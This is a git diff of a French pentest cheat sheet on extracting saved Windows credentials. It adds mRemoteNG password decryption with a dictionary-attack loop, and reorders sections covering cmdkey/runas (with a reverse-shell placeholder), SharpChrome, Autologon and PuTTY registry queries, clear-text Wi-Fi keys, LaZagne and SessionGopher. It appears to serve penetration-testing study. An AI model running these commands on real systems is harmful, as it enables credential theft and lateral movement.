@@ -12,7 +12,8 @@ dir "%USERPROFILE%\Desktop"
 
 ## Mots de passe enregistrés
 
-### cmdkey
+### Extraction manuelle
+#### cmdkey
 
 Si la commande `cmdkey /list` affiche des comptes, on pourra :
 
@@ -23,7 +24,7 @@ Si la commande `cmdkey /list` affiche des comptes, on pourra :
 runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 ```
 
-### Google Chrome
+#### Google Chrome
 
 [SharpChrome](https://github.com/GhostPack/SharpDPAPI) peut extraire les identifiants mot de passe stockés.
 
@@ -31,7 +32,7 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 .\SharpChrome.exe logins /unprotect
 ```
 
-### mRemoteNG
+#### mRemoteNG
 
 Les fichiers de configuration sont stockés dans  `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`
 
@@ -50,9 +51,50 @@ Les fichiers ont la forme suivante :
 </Connections>
 ```
 
-Les mots de passes sont stockés sous une forme chiffrée avec le mot de passe par défaut `mR3m`
-## Outils ciblant plusieures applicatifs
-### Lazagne
+Les mots de passes sont stockés sous une forme chiffrée avec le mot de passe par défaut `mR3m`.
+
+L'outil  [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) permet de décrypter le mot de passe.
+
+##### Déchiffrement du mot de passe
+
+```shell
+# clé de chiffrement par défaut : mR3m
+python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="
+
+# Autre clé
+python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
+
+# Attaque par dictionnaire pour trouver le mot de passe 
+for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done 
+```
+
+#### Autologon
+
+```shell
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdmin Username Password"
+```
+
+#### Putty
+
+```shell
+# Liste des sessions enregistrées
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+# Interrogation d'une session
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Server1 | findstr /i "User Pass"
+```
+
+#### Mots de passe Wifi
+
+```shell
+# Liste des profiles
+netsh wlan show profile
+
+# Affichage de la clé wifi du profile "Profile1"
+netsh wlan show profile Profile1 key=clear
+```
+
+### Outils ciblant plusieures applicatifs
+#### Lazagne
 
 Collecte de nombreux mots de passe stockés dans diverses endroits du système
 
@@ -64,7 +106,7 @@ Liste des applicatifs supportés : <https://github.com/AlessandroZ/LaZagne#suppo
 lazagne.exe all
 ```
 
-### SessionGopher
+#### SessionGopher
 
 D'après la documentation du projet, décrypte les mots de passes stockés dans les configuration des applications suivantes : PuTTY, WinSCP, FileZilla, SuperPuTTY, et RDP.
 
@@ -73,31 +115,6 @@ D'après la documentation du projet, décrypte les mots de passes stockés dans 
 ```powershell
 Import-Module .\SessionGopher.ps1
 Invoke-SessionGopher -Target SRV1 # si privilèges suffisants. Sinon, on peut chercher des infos pour son propre compte utilisateur ou tout ceux du poste (si admin)
-```
-
-### Autologon
-
-```shell
-reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "AutoAdmin Username Password"
-```
-
-### Putty
-
-```shell
-# Liste des sessions enregistrées
-reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
-# Interrogation d'une session
-reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Server1 | findstr /i "User Pass"
-```
-
-### Mots de passe Wifi
-
-```shell
-# Liste des profiles
-netsh wlan show profile
-
-# Affichage de la clé wifi du profile "Profile1"
-netsh wlan show profile Profile1 key=clear
 ```
 
 ## Fichiers Intéressants
